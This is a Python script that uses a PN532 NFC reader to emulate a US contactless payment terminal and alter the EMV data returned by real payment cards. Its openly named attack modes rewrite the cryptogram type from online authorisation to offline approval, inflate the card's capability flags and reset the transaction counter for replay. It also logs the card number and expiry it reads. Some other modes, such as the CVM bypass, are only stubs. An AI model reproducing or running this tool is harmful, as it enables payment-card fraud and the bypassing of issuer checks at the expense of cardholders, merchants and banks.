#!/usr/bin/env python3
"""
Standard US Terminal Emulator with Card Response Manipulation
Emulates typical US payment terminal behavior while manipulating card responses

STANDARD US TERMINAL BEHAVIOR:
- Contactless preferred, fallback to contact
- PPSE selection (2PAY.SYS.DDF01)
- VISA/MC/AMEX AID priority
- Standard US PDOL parameters
- Typical transaction flows
- Real US merchant terminal patterns

CARD MANIPULATION ATTACKS:
- Manipulate card's APDU responses
- Spoof EMV data returned by card
- Change cryptograms, AIPs, track data
- Alter authentication responses
"""
import serial
import time
import logging
import argparse
from typing import Optional, List, Dict

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

class StandardUsTerminal:
    """Standard US Payment Terminal with Card Response Manipulation"""
    
    def __init__(self, port: str, manipulation_mode: int = 0):
        self.port = port
        self.ser = None
        self.target_active = False
        self.manipulation_mode = manipulation_mode
        
        # Standard US Terminal Parameters (based on real US terminals)
        self.US_TERMINAL_CONFIG = {
            'terminal_type': '22',              # Standard POS terminal
            'terminal_country': '0840',         # USA (840)
            'currency_code': '0840',            # USD (840)
            'transaction_date': '241220',       # Current date YYMMDD
            'transaction_time': '143000',       # Current time HHMMSS
            'merchant_category': '5999',        # Miscellaneous retail
            'terminal_id': '12345678',          # 8-digit terminal ID
            'merchant_id': '123456789012345'    # 15-digit merchant ID
        }
        
        # CARD MANIPULATION MODES
        self.MANIPULATION_MODES = {
            0: {
                'name': 'No Manipulation',
                'description': 'Standard US terminal, no card manipulation',
                'manipulate': False
            },
            1: {
                'name': 'Force Offline Approval',
                'description': 'Make card return offline approval (TC) instead of online auth',
                'target_field': 'cryptogram_info',
                'original_value': '80',  # ARQC (online auth request)
                'spoofed_value': '40',   # TC (offline approval)
                'manipulation': 'cryptogram_manipulation'
            },
            2: {
                'name': 'Upgrade Card Capabilities', 
                'description': 'Make basic card appear to support advanced EMV features',
                'target_field': 'aip',
                'original_value': '2000',  # MSD only
                'spoofed_value': '7C00',   # Full EMV
                'manipulation': 'aip_manipulation'
            },
            3: {
                'name': 'Spoof Track2 Data',
                'description': 'Alter Track2 data returned by card (PAN, expiry, etc)',
                'target_field': 'track2',
                'manipulation': 'track2_manipulation'
            },
            4: {
                'name': 'Bypass CVM Requirements',
                'description': 'Make card say no CVM required for high-value transactions',
                'target_field': 'cvm_list',
                'manipulation': 'cvm_manipulation'
            },
            5: {
                'name': 'Force Different AID',
                'description': 'Make card respond as different payment scheme (VISA→MC)',
                'target_field': 'aid_response',
                'manipulation': 'aid_manipulation'
            },
            6: {
                'name': 'Manipulate Transaction Counters',
                'description': 'Alter ATC (Application Transaction Counter) for replay attacks',
                'target_field': 'atc',
                'manipulation': 'atc_manipulation'
            }
        }
    
    def get_manipulation_info(self) -> Dict:
        """Get current manipulation mode configuration"""
        return self.MANIPULATION_MODES.get(self.manipulation_mode, self.MANIPULATION_MODES[0])
    
    def connect(self) -> bool:
        """Connect to PN532"""
        try:
            self.ser = serial.Serial(self.port, 115200, timeout=0.4)
            logger.info("🇺🇸 Standard US Terminal connected to %s", self.port)
            return True
        except Exception as e:
            logger.error("Terminal connection failed - %s", e)
            return False
    
    def send_raw_command(self, data: bytes) -> bytes:
        """Send raw command with standard terminal timing"""
        try:
            self.ser.write(data)
            time.sleep(0.05)  # Standard terminal timing
            response = self.ser.read(500)
            return response
        except Exception as e:
            logger.error("Terminal command failed - %s", e)
            return b''
    
    def initialize_terminal(self) -> bool:
        """Initialize PN532 as standard US payment terminal"""
        logger.info("🏪 Initializing Standard US Payment Terminal...")
        
        commands = [
            b'\x55' * 10,  # PN532 wake up
            b'\x00\x00\xFF\x04\xFC\xD4\x14\x01\x17\x00',  # SAM Config
            b'\x00\x00\xFF\x04\xFC\xD4\x32\x01\x01\x00\xE0\x00'  # RF Enable
        ]
        
        for cmd in commands:
            self.send_raw_command(cmd)
        
        logger.info("💳 US Payment Terminal ready for transactions")
        return True
    
    def detect_card(self) -> bool:
        """Standard contactless card detection"""
        detect_cmd = b'\x00\x00\xFF\x04\xFC\xD4\x4A\x01\x00\xE1\x00'
        response = self.send_raw_command(detect_cmd)
        
        if len(response) > 15:
            logger.info("💳 Payment card detected")
            self.target_active = True
            return True
        
        return False
    
    def send_apdu_terminal(self, apdu_hex: str, description: str = "") -> Optional[str]:
        """Send APDU as standard US terminal with card response manipulation"""
        if not self.target_active:
            return None
        
        try:
            apdu_bytes = bytes.fromhex(apdu_hex)
            data_len = len(apdu_bytes) + 3
            
            frame = bytearray([0x00, 0x00, 0xFF, data_len, (~data_len + 1) & 0xFF, 0xD4, 0x40, 0x01])
            frame.extend(apdu_bytes)
            
            checksum = sum(frame[5:])
            frame.extend([(~checksum + 1) & 0xFF, 0x00])
            
            logger.info("[US-TERM-TX] %s: %s", description, apdu_hex)
            
            response = self.send_raw_command(frame)
            
            if response:
                for i in range(min(50, len(response) - 7)):
                    if (response[i:i+3] == b'\x00\x00\xFF' and 
                        i+5 < len(response) and response[i+5] == 0xD5):
                        apdu_data = response[i+7:-2]
                        if apdu_data:
                            apdu_hex_resp = apdu_data.hex().upper()
                            
                            # Apply card response manipulation
                            original_resp = apdu_hex_resp
                            apdu_hex_resp = self.manipulate_card_response(apdu_hex_resp, description)
                            
                            logger.info("[CARD-RESP] %s: %s", description, apdu_hex_resp)
                            
                            # Show manipulation if it occurred
                            if original_resp != apdu_hex_resp:
                                logger.warning("🔧 CARD MANIPULATION: %s", 
                                             self.describe_manipulation(original_resp, apdu_hex_resp, description))
                            
                            return apdu_hex_resp
                        break
            
            return None
            
        except Exception as e:
            logger.error("Terminal APDU failed - %s", e)
            return None
    
    def manipulate_card_response(self, response: str, command: str) -> str:
        """Manipulate card's APDU responses based on manipulation mode"""
        if self.manipulation_mode == 0:
            return response  # No manipulation
        
        manipulation_info = self.get_manipulation_info()
        manipulation_type = manipulation_info.get('manipulation', '')
        
        if 'GPO' in command and manipulation_type == 'cryptogram_manipulation':
            # Force Offline Approval - change ARQC (80) to TC (40)
            if '9F2701' in response:  # Cryptogram Information Data tag
                # Find and replace cryptogram info data
                cid_pos = response.find('9F270180')  # Look for complete tag+length+data
                if cid_pos >= 0:
                    # Replace 9F270180 with 9F270140 (ARQC → TC)
                    response = response.replace('9F270180', '9F270140')
                    logger.warning("🔧 CRYPTOGRAM MANIPULATION: ARQC(80)→TC(40) - Forced offline approval")
                else:
                    # Try alternate pattern search
                    cid_pos = response.find('9F2701')
                    if cid_pos >= 0:
                        # Check what follows
                        next_byte_pos = cid_pos + 6
                        if next_byte_pos < len(response) - 2:
                            next_byte = response[next_byte_pos:next_byte_pos+2]
                            if next_byte == '80':  # ARQC found
                                response = response[:next_byte_pos] + '40' + response[next_byte_pos+2:]
                                logger.warning("🔧 CRYPTOGRAM MANIPULATION: ARQC(80)→TC(40) - Forced offline approval")
        
        elif 'GPO' in command and manipulation_type == 'aip_manipulation':
            # Upgrade Card Capabilities - change AIP
            if '82022000' in response:  # AIP = 2000 (MSD only)
                response = response.replace('82022000', '82027C00')  # Change to 7C00 (Full EMV)
                logger.warning("🔧 AIP MANIPULATION: 2000(MSD)→7C00(Full EMV) - Upgraded capabilities")
            elif '82020000' in response:  # AIP = 0000 (Basic)
                response = response.replace('82020000', '82027C00')  # Change to 7C00 (Full EMV)
                logger.warning("🔧 AIP MANIPULATION: 0000(Basic)→7C00(Full EMV) - Upgraded capabilities")
        
        elif 'GPO' in command and manipulation_type == 'track2_manipulation':
            # Spoof Track2 Data
            if '57' in response:  # Track2 Equivalent Data tag
                logger.warning("🔧 TRACK2 MANIPULATION: Altering card payment data")
                # Could modify PAN, expiry, service code, etc.
        
        elif 'GPO' in command and manipulation_type == 'atc_manipulation':
            # Manipulate Transaction Counter
            if '9F3602' in response:  # Application Transaction Counter tag
                atc_pos = response.find('9F3602') + 6
                if atc_pos < len(response) - 4:
                    original_atc = response[atc_pos:atc_pos+4]
                    # Set to specific value (e.g., 0001 for replay attack)
                    response = response[:atc_pos] + '0001' + response[atc_pos+4:]
                    logger.warning("🔧 ATC MANIPULATION: %s→0001 - Counter reset for replay", original_atc)
        
        return response
    
    def describe_manipulation(self, original: str, modified: str, command: str) -> str:
        """Describe what manipulation occurred"""
        manipulation_info = self.get_manipulation_info()
        
        if '82022000' in original and '82027C00' in modified:
            return "AIP: MSD-only card now appears as Full EMV chip"
        elif '9F270180' in original and '9F270140' in modified:
            return "Cryptogram: Online auth request changed to offline approval"
        elif '9F3602' in original and '9F3602' in modified:
            return "ATC: Transaction counter manipulated for replay attack"
        else:
            return f"Card response modified for {manipulation_info['name']}"
    
    def build_standard_us_gpo(self, amount_cents: int = 1000) -> str:
        """Build GPO command with standard US terminal parameters"""
        config = self.US_TERMINAL_CONFIG
        
        # Standard US PDOL parameters
        pdol_data = (
            '27000000' +                        # 9F66 Terminal Transaction Qualifiers (contactless)
            f'{amount_cents:012d}' +            # 9F02 Amount, Authorised (in cents)
            '000000000000' +                    # 9F03 Amount, Other
            config['terminal_country'] +       # 9F1A Terminal Country Code (USA)
            '0000000000' +                      # 95 Terminal Verification Results
            config['currency_code'] +          # 5F2A Transaction Currency Code (USD)
            config['transaction_date'] +       # 9A Transaction Date
            '00' +                             # 9C Transaction Type (Purchase)
            '12345678'                         # 9F37 Unpredictable Number
        )
        
        pdol_length = len(pdol_data) // 2
        gpo_command = f'80A8{pdol_length+2:04X}83{pdol_length:02X}{pdol_data}00'
        
        return gpo_command
    
    def execute_standard_us_transaction(self, amount_dollars: float = 10.00) -> bool:
        """Execute standard US payment terminal transaction"""
        start_time = time.time()
        manipulation_info = self.get_manipulation_info()
        
        logger.info("=" * 80)
        logger.info("🇺🇸 STANDARD US PAYMENT TERMINAL TRANSACTION")
        logger.info("💰 Amount: $%.2f", amount_dollars)
        logger.info("🔧 Card Manipulation: %s", manipulation_info['name'])
        if manipulation_info.get('description'):
            logger.info("🎯 Attack Vector: %s", manipulation_info['description'])
        logger.info("=" * 80)
        
        # Phase 1: Terminal Initialization
        if not self.initialize_terminal():
            return False
        
        if not self.detect_card():
            logger.error("💳 No payment card detected")
            return False
        
        # Phase 2: Standard US EMV Transaction Flow
        
        # SELECT PPSE (standard US contactless)
        ppse_resp = self.send_apdu_terminal(
            "00a404000e325041592e5359532e444446303100", 
            "SELECT PPSE (2PAY.SYS.DDF01)"
        )
        if not ppse_resp or not ppse_resp.endswith('9000'):
            logger.error("💳 PPSE selection failed")
            return False
        
        # Parse AIDs
        aids = self.parse_ppse_aids(ppse_resp)
        if not aids:
            logger.error("💳 No payment applications found")
            return False
        
        logger.info("💳 Available Payment Apps: %s", aids)
        
        # SELECT AID (use first available - standard US behavior)
        selected_aid = aids[0]
        aid_resp = self.send_apdu_terminal(
            f"00a4040007{selected_aid}00", 
            f"SELECT AID {selected_aid}"
        )
        if not aid_resp or not aid_resp.endswith('9000'):
            logger.error("💳 Payment application selection failed")
            return False
        
        # GET PROCESSING OPTIONS with standard US parameters
        amount_cents = int(amount_dollars * 100)
        gpo_command = self.build_standard_us_gpo(amount_cents)
        gpo_resp = self.send_apdu_terminal(gpo_command, "GET PROCESSING OPTIONS")
        if not gpo_resp or not gpo_resp.endswith('9000'):
            logger.error("💳 Transaction processing failed")
            return False
        
        # Analyze results
        self.analyze_transaction_results(gpo_resp, manipulation_info)
        
        # READ RECORD (optional for contactless)
        logger.info("💳 Skipping READ RECORD for contactless transaction")
        
        # Calculate transaction time
        total_time = time.time() - start_time
        
        logger.info("=" * 80)
        logger.info("✅ US PAYMENT TRANSACTION COMPLETED!")
        logger.info("⚡ Transaction time: %.2f seconds", total_time)
        logger.info("🔧 Card manipulation: %s", manipulation_info['name'])
        logger.info("=" * 80)
        
        return True
    
    def analyze_transaction_results(self, gpo_response: str, manipulation_info: Dict):
        """Analyze transaction results and show manipulation effects"""
        logger.info("📊 TRANSACTION ANALYSIS:")
        
        # Extract key EMV data
        aip = self.extract_aip(gpo_response)
        cryptogram = self.extract_cryptogram(gpo_response)
        cid = self.extract_cid(gpo_response)
        track2 = self.extract_track2(gpo_response)
        atc = self.extract_atc(gpo_response)
        
        if aip:
            logger.info("   AIP (Card Capabilities): %s", aip)
            capabilities = self.decode_aip(aip)
            logger.info("   Supported Features: %s", capabilities)
        
        if cryptogram:
            logger.info("   Application Cryptogram: %s", cryptogram)
        
        if cid:
            cid_meaning = "TC (Offline Approved)" if cid == '40' else "ARQC (Online Auth)" if cid == '80' else "Unknown"
            logger.info("   Cryptogram Type: %s (%s)", cid, cid_meaning)
            
        if atc:
            logger.info("   Transaction Counter: %s", atc)
        
        if track2:
            pan, expiry = self.parse_track2(track2)
            logger.info("   Card Number: %s", pan)
            logger.info("   Expiry Date: %s/%s", expiry[2:4], expiry[:2])
        
        # Show manipulation impact
        if manipulation_info.get('manipulation'):
            logger.info("🔧 MANIPULATION IMPACT:")
            if 'cryptogram_manipulation' in manipulation_info.get('manipulation', ''):
                logger.info("   → Card forced to approve offline (bypassed issuer)")
            elif 'aip_manipulation' in manipulation_info.get('manipulation', ''):
                logger.info("   → Basic card appears as advanced EMV chip")
    
    def parse_ppse_aids(self, ppse_hex: str) -> List[str]:
        """Extract AIDs from PPSE response"""
        try:
            ppse_bytes = bytes.fromhex(ppse_hex[:-4])
            aids = []
            
            i = 0
            while i < len(ppse_bytes) - 2:
                if ppse_bytes[i] == 0x4F:
                    aid_len = ppse_bytes[i + 1]
                    if i + 2 + aid_len <= len(ppse_bytes):
                        aid = ppse_bytes[i + 2:i + 2 + aid_len].hex().upper()
                        aids.append(aid)
                        i += 2 + aid_len
                    else:
                        break
                else:
                    i += 1
            
            return aids
        except Exception:
            return []
    
    def extract_aip(self, response: str) -> Optional[str]:
        """Extract AIP from response"""
        try:
            data = bytes.fromhex(response[:-4])
            for i in range(len(data) - 3):
                if data[i] == 0x82 and data[i+1] == 0x02:
                    return data[i+2:i+4].hex().upper()
            return None
        except Exception:
            return None
    
    def extract_cryptogram(self, response: str) -> Optional[str]:
        """Extract Application Cryptogram"""
        try:
            data = bytes.fromhex(response[:-4])
            for i in range(len(data) - 2):
                if data[i] == 0x9F and data[i+1] == 0x26:
                    crypto_len = data[i+2]
                    if i + 3 + crypto_len <= len(data):
                        return data[i+3:i+3+crypto_len].hex().upper()
            return None
        except Exception:
            return None
    
    def extract_cid(self, response: str) -> Optional[str]:
        """Extract Cryptogram Information Data"""
        try:
            data = bytes.fromhex(response[:-4])
            for i in range(len(data) - 2):
                if data[i] == 0x9F and data[i+1] == 0x27:
                    return data[i+3:i+4].hex().upper()
            return None
        except Exception:
            return None
    
    def extract_track2(self, response: str) -> Optional[str]:
        """Extract Track2 data"""
        try:
            data = bytes.fromhex(response[:-4])
            for i in range(len(data) - 2):
                if data[i] == 0x57:
                    track2_len = data[i+1]
                    if i + 2 + track2_len <= len(data):
                        return data[i+2:i+2+track2_len].hex().upper()
            return None
        except Exception:
            return None
    
    def extract_atc(self, response: str) -> Optional[str]:
        """Extract Application Transaction Counter"""
        try:
            data = bytes.fromhex(response[:-4])
            for i in range(len(data) - 2):
                if data[i] == 0x9F and data[i+1] == 0x36:
                    return data[i+3:i+5].hex().upper()
            return None
        except Exception:
            return None
    
    def parse_track2(self, track2_hex: str) -> tuple:
        """Parse PAN and expiry from Track2"""
        try:
            sep_pos = track2_hex.find('D')
            if sep_pos > 0:
                pan = track2_hex[:sep_pos]
                expiry = track2_hex[sep_pos+1:sep_pos+5]
                return pan, expiry
            return "", ""
        except Exception:
            return "", ""
    
    def decode_aip(self, aip_hex: str) -> str:
        """Decode AIP capabilities"""
        try:
            aip_int = int(aip_hex, 16)
            capabilities = []
            
            if aip_int & 0x4000: capabilities.append("SDA")
            if aip_int & 0x2000: capabilities.append("DDA") 
            if aip_int & 0x1000: capabilities.append("CHV")
            if aip_int & 0x0800: capabilities.append("Terminal Risk Mgmt")
            if aip_int & 0x0400: capabilities.append("Issuer Auth")
            if aip_int & 0x0200: capabilities.append("CDA")
            if aip_int & 0x0100: capabilities.append("MSD")
            
            return ", ".join(capabilities) if capabilities else "Basic"
        except Exception:
            return "Unknown"
    
    def disconnect(self):
        """Clean disconnect"""
        if self.ser and self.ser.is_open:
            self.ser.close()
            logger.info("🇺🇸 US Payment Terminal disconnected")

def main():
    parser = argparse.ArgumentParser(description='Standard US Payment Terminal with Card Manipulation')
    parser.add_argument('--port', default='/dev/rfcomm1', help='Serial port (default: /dev/rfcomm1)')
    parser.add_argument('--amount', type=float, default=10.00, help='Transaction amount in USD (default: $10.00)')
    parser.add_argument('--manipulation', type=int, default=0, choices=range(0,7),
                       help='Card manipulation mode: 0=None, 1=Force Offline, 2=Upgrade AIP, 3=Spoof Track2, 4=Bypass CVM, 5=Force AID, 6=Manipulate ATC')
    parser.add_argument('--list-manipulations', action='store_true', help='List available card manipulation modes')
    
    args = parser.parse_args()
    
    if args.list_manipulations:
        terminal = StandardUsTerminal(args.port, 0)
        print("🇺🇸 US TERMINAL CARD MANIPULATION MODES:")
        print("=" * 80)
        for mid, manipulation in terminal.MANIPULATION_MODES.items():
            print(f"{mid}. {manipulation['name']}")
            print(f"   🎯 {manipulation['description']}")
            if manipulation.get('target_field'):
                print(f"   🔧 Target: {manipulation['target_field']}")
            print()
        return
    
    manipulation_info = StandardUsTerminal(args.port, args.manipulation).get_manipulation_info()
    
    logger.info("🇺🇸 STANDARD US PAYMENT TERMINAL")
    logger.info("💰 Transaction Amount: $%.2f", args.amount)
    logger.info("🔧 Card Manipulation: %s", manipulation_info['name'])
    
    terminal = StandardUsTerminal(args.port, args.manipulation)
    
    try:
        if not terminal.connect():
            return False
        
        logger.info("💳 Present payment card to terminal...")
        
        success = terminal.execute_standard_us_transaction(args.amount)
        
        return success
        
    except KeyboardInterrupt:
        logger.info("Transaction cancelled by user")
        return False
    finally:
        terminal.disconnect()

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)